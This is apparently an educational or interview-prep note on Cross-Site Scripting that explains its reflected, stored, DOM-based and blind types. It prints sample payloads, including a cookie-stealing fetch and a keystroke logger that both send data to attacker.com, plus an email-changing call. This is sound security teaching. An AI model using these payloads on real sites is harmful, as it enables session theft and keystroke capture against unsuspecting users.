Cross-Site Scripting (XSS)
📌 Overview

Cross-Site Scripting (XSS) is an injection vulnerability where malicious JavaScript is injected into a web application and executed in another user’s browser.

XSS is one of the most common web vulnerabilities and part of OWASP Top 10.

🧠 What Does XSS Stand For?
Cross-Site Scripting

💥 What is a Payload?

In XSS, a payload is the malicious JavaScript code executed in the victim’s browser.

A payload has:

🎯 Intention (what it does)

🔧 Modification (how it bypasses filters)

🎯 Common XSS Payload Intentions
1️⃣ Proof of Concept (PoC)
<script>alert('XSS');</script>


Used to demonstrate vulnerability.

2️⃣ Session Stealing
<script>fetch('https://attacker.com?cookie=' + btoa(document.cookie));</script>


Steals:

document.cookie

3️⃣ Keylogger
<script>
document.onkeypress = function(e) {
 fetch('https://attacker.com?key=' + btoa(e.key));
}
</script>

4️⃣ Business Logic Abuse
<script>user.changeEmail('attacker@evil.com');</script>

🔍 Important Interview Points

Which document property stores session tokens?

document.cookie


Which JS method is common PoC?

alert()

🟥 Types of XSS
1️⃣ Reflected XSS
What is it?

User input reflected immediately in response without validation.

Example:
https://site.com?error=YOUR_INPUT

Where to test?

URL parameters

URL path

Headers (rare)

Impact:

Session hijacking

Credential theft

Malicious redirects

2️⃣ Stored XSS
What is it?

Payload stored in:

Database


Then executed when other users view content.

Common Injection Points:

Blog comments

Profile fields

Support tickets

Reviews

Impact:

Persistent session theft

Mass exploitation

3️⃣ DOM-Based XSS
What is DOM?

Document Object Model.

DOM XSS happens entirely in browser JavaScript.

No backend involvement.

Example:
document.write(window.location.hash);


If attacker controls window.location.hash, they control DOM.

Dangerous JS Methods:
eval()


Also:

innerHTML

document.write

setTimeout

setInterval

4️⃣ Blind XSS

Similar to Stored XSS, but:

Attacker cannot see execution

Payload executes in admin/staff panel

Detection Tool:
XSS Hunter Express

